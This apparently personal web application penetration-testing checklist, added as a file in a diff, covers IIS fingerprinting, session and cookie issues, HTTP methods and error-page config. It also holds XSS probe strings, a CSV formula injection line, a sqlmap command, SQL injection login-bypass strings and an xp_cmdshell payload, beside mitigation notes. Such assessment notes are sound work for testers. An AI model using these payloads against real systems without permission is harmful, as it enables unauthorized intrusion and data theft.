@@ -1,0 +1,231 @@
+01. An adversary can fingerprint the web server from HTTP responses.  
+	Server: Microsoft - IIS / 8 (any version)
+	X-AspNet-Version:4.0.30319 (any version)
+	X-Powered-By:ARR / 2.5 (any version)
+	
+02. An adversary can enumerate valid username (Check Error Messages) (Both Mobile and Desktop). 
+03. Default server pages accessible. 
+04. Session cookie attributes are not set properly (Path Should not be root Ex - /any_folder).
+05. A local adversary can steal passwords from the Autocomplete feature of the browser.
+06. The application has a weak password policy (not IMP but cross check).
+07. A local adversary can steal passwords from the browsers memory (Win Hex Soft Req).
+08. An adversary can view restricted files by directory listing.
+09. Nonexistent Page (404 200 any others error) Physical Path Disclosure.
+10. Last login time and last few activities are not displayed on valid user login.
+11. Session Management -The application does not validate the session on closing the Page (Same check for Cross Browser).
+12. An adversary can bypass login (SQL Injection).
+13. An adversary can steal sensitive application data by sniffing cleartext traffic.
+14. An adversary can Click Jacking (need to Create HTML file).
+15. Cross-Site Scripting (XSS).
+16. Response tamparing.
+17. CSRF should be implement (paid Tool).
+18. Sensitive Data Exposure.
+19. File Uploading validation (Check Invalid file with correct Extention).
+20. auto complete should be disabled on login page.
+21. Dont allow to save Login Details in Browser.
+22. Critical information in URL (File Downloading URL).
+23. session timeout should be implement. (on sleep mode).
+24. User parameter query with Token for featching any details.
+25. Allow method types : PUT PATCH DELETE COPY HEAD OPTIONS LINK UNLINK PURGE LOCK UNLOCK PROPFIND VIEW
+
+
+HEAD		Same as GET but returns only HTTP headers and no document body
+PUT			Uploads a representation of the specified URI
+DELETE		Deletes the specified resource
+OPTIONS		Returns the HTTP methods that the server supports
+CONNECT		Converts the request connection to a transparent TCP/IP tunnel
+TRACE       Performs a message loop-back test along the path to the target resource.
+PATCH       The PATCH method applies partial modifications to a resource
+
+
+GET
+POST
+HEAD
+PUT
+DELETE
+TRACE
+OPTIONS
+CONNECT
+DEBUG
+PATCH
+
+
+1xx Informational
+2xx Success
+3xx Redirection
+4xx Client Error
+5xx Server Error
+
+
+ <customHeaders>
+        <add name="Allow"  value="GET,POST,HEAD" />
+      </customHeaders>
+
+
+ <system.webServer>
+    <httpErrors existingResponse="Replace" defaultResponseMode="Redirect" errorMode="Custom">
+      <remove statusCode="501"/>
+      <error statusCode="501" responseMode="ExecuteURL" path="/Engagepro/Error.aspx"/>
+      <remove statusCode="403"/>
+      <error statusCode="403" responseMode="ExecuteURL" path="/Engagepro/Error.aspx"/>
+    </httpErrors>
+
+
+<customErrors mode="Off" defaultRedirect="Error.aspx">
+      <error statusCode="403" redirect="Error.aspx" />
+      <error statusCode="404" redirect="Error.aspx" />
+      <error statusCode="400" redirect="Error.aspx" />
+      <error statusCode="500" redirect="Error.aspx" />
+      <error statusCode="501" redirect="Error.aspx" />
+    </customErrors>
+
+<script>alert(123)</script>
+test"><svg onload=alert(1)>
+=cmd|' /C calc'!A0
+<script>alert(1)</script>
+<script>alert(1)</script>
+%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
+%3cscript%3ealert(1)%3c%2fscript%3e
+%3cscript%3ealert(1)%3c/script%3e
+\";alert('XSS');//
+
+
+
+
+
+
+# OWASP Top 10 Status
+A01 Injection 
+A02 Broken Authentication and Session Management
+A03 Cross-Site Scripting (XSS) 
+A04 Insecure Direct Object References 
+A05 Security Misconfiguration 
+A06 Sensitive Data Exposure 
+A07 Missing Function Level Access Control
+A08 Cross Site Request Forgery (CSRF) 
+A09 Using Components with Known vulnerabilities 
+A10 Unvalidated Redirects and Forwards 
+
+
+
+copy and paste request into body
+run command Pinata.py
+copy and paste request into body
+run command Pinata.py
+
+python sqlmap.py -r "file path" --dbms mssql --level 5 --risk 5
+                                --dbms sql --threads 10
+								--dbms sqlmap
+a'or 1=1;--
+?or 1=1--
+' or 1=1--
+' or 'a'='a
+
+' or 1=1--
+" or 1=1--
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+'neo'--
+
+
+BLIND SQL
+ERROR SQL
+,,',",--,//,!,#,*,(,),%,`,~	
+SQL Injection
+  1: a
+  2: a' 
+  3: a' --
+  4: a' or 1=1; --
+  5: @
+  6: ?
+  7: ' and 1=0) union all
+  8: ? or 1=1 --
+  9: x' and userid is NULL; --
+  10: x' and email is NULL; --
+  11: anything' or 'x'='x
+  12: x' and 1=(select count(*) from tabname); --
+  13: x' and members.email is NULL; --
+  14: x' or full_name like '%bob%
+  15: 23 or 1=1; --
+  16: '; exec master..xp_cmdshell 'ping 172.10.1.255'
+
+
+
+How to avoid SQL Injection?   '"/\;
+Filter out character like single quote, double quote, slash, back slash, semi colon, extended character like NULL, carry return, new line, etc, in all strings from:
+ - Input from users
+ - Parameters from URL
+ - Values from cookie
+
+For numeric value, convert it to an integer before parsing it into SQL statement. Or using ISNUMERIC to make sure it is an integer.
+
+Change "Startup and run SQL Server" using low privilege user in SQL Server Security tab.
+
+Delete stored procedures that you are not using like:
+
+master..Xp_cmdshell, xp_startmail, xp_sendmail, sp_makewebtask
+
+--------------x-o-x--------------x-o-x--------------x-o-x--------------x-o-x--------------x-o-x--------------x-o-x--------------x-o-x
+
+Types of Queries used in SQL  
+1.Inline---  SQL Injection possible
+2.Parameterize--
+3.Stored Procedure 
+
+A stored procedure (also termed proc, storp, sproc, StoPro, StoredProc, StoreProc, sp, or SP) is a subroutine available to applications that access a relational database management system (RDBMS). Such procedures are stored in the database data dictionary
+
+
+I would like to quote Tom Kyte from Oracle here...Here's his rule on where to write code...though a bit unrelated but good to know I guess.
+
+Start with stored procedures in PL/SQL...
+If you think something can't be done using stored procedure in PL/SQL, use Java stored procedure.
+If you think something can't be done using Java Stored procedure, consider Pro*c.
+If you think you can't achieve something using Pro*C, you might want to rethink what you need to get done.
+
+
+
+customer 
+ID Customer_name pincode address
+
+Select customer_name from customer where pincode='a'or 1=1;--';
+
+
++---------------------------------+----------------------------------------+
+| Stored Procedure (SP)           | Function (UDF - User Defined           |
+|                                 | Function)                              |
++---------------------------------+----------------------------------------+
+| SP can return zero , single or  | Function must return a single value    |
+| multiple values.                | (which may be a scalar or a table).    |
++---------------------------------+----------------------------------------+
+| We can use transaction in SP.   | We can't use transaction in UDF.       |
++---------------------------------+----------------------------------------+
+| SP can have input/output        | Only input parameter.                  |
+| parameter.                      |                                        |
++---------------------------------+----------------------------------------+
+| We can call function from SP.   | We can't call SP from function.        |
++---------------------------------+----------------------------------------+
+| We can't use SP in SELECT/      | We can use UDF in SELECT/ WHERE/       |
+| WHERE/ HAVING statement.        | HAVING statement.                      |
++---------------------------------+----------------------------------------+
+| We can use exception handling   | We can't use Try-Catch block in UDF.   |
+| using Try-Catch block in SP.    |                                        |
++---------------------------------+----------------------------------------+
+
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+IIS Version URL Result/Error Message
+IIS 6    /valid*~1*/.aspx    --------HTTP 404 - File not found
+IIS 6    /Invalid*~1*/.aspx    HTTP 400 - Bad Request
+IIS 5.x  /valid*~1* HTTP 404 - File not found
+IIS 5.x  /Invalid*~1* HTTP 400 - Bad Request
+IIS 7.x .Net.2
+No Error Handling
+/valid*~1*/ Page contains:
+“Error Code 0x00000000”
+IIS 7.x .Net.2
+No Error Handling
+/Invalid*~1*/ Page contains:
+“Error Code 0x80070002”
